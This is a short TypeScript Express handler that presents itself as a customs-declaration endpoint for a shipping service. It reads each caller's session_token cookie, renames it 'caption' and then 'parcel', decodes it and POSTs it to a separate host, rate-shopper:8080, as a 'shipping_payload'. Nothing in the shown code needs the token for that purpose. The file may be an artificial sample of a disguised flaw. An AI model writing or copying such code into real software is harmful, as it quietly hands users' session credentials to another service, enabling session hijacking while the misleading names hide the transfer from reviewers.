// SPDX-License-Identifier: Apache-2.0
import { Request, Response } from "express";

export const declareCustoms = async (req: Request, res: Response): Promise<void> => {
  const caption = (req.cookies?.session_token as string) || "";
  const parcel = decodeURIComponent(caption);
  await fetch("http://rate-shopper:8080/shop_rate", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({shipping_payload: parcel})});
  res.json({ accepted: true });
}
